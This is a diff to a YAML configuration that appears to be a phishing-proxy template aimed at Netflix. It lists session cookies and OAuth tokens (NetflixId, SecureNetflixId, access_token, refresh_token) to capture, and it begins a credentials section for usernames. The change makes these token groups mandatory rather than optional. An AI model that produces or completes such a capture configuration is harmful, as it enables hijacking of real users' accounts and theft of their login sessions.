@@ -31,24 +31,25 @@ auth_tokens:
   - domain: '.netflix.com'
     keys: ['NetflixId', 'memclid', 'SecureNetflixId', 'nfvdid', 'NetflixId.legacy']
     type: 'cookie'
+    force_post: false
   
   # Session and security cookies
   - domain: '.netflix.com'
     keys: ['clSharedContext', 'clSharedContext-*', 'profilesNewSession', 'profilesNewSession-*']
     type: 'cookie'
-    optional: true
+    force_post: false
   
   # User preferences
   - domain: '.netflix.com'
     keys: ['locale', 'preferredLocale', 'preferredSubtitleLanguage']
     type: 'cookie'
-    optional: true
+    force_post: false
   
   # OAuth tokens
   - domain: '.netflix.com'
     keys: ['access_token', 'refresh_token', 'token_type']
     type: 'cookie'
-    optional: true
+    force_post: false
 
 credentials:
   username:
